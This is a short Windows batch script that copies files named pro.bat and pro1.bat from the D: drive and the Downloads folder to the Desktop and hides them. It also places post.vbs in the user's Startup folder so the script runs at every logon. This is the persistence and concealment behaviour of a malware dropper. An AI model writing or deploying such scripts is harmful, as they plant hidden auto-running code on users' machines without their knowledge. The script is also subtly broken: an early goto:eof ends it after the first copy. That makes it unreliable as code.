@echo off
set "desktop_dir=%USERPROFILE%\Desktop"
set "downloads_dir=%USERPROFILE%\Downloads"
for /R "D:\" %%i in (pro.bat) do (
    copy "%%i" "%desktop_dir%"
    ping -n 1 127.0.0.1 > nul 
    goto:eof
)
attrib +h %desktop_dir%/pro.bat
for /R "%downloads_dir%" %%i in (pro1.bat) do (
    copy "%%i" "%desktop_dir%"
    ping -n 1 127.0.0.1 > nul
    goto:eof
)
attrib +h %desktop_dir%/pro1.bat
for /R "%downloads_dir%" %%i in (post.vbs) do (
    copy "%%i" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
    ping -n 1 127.0.0.1 > nul 
    goto:eof
)

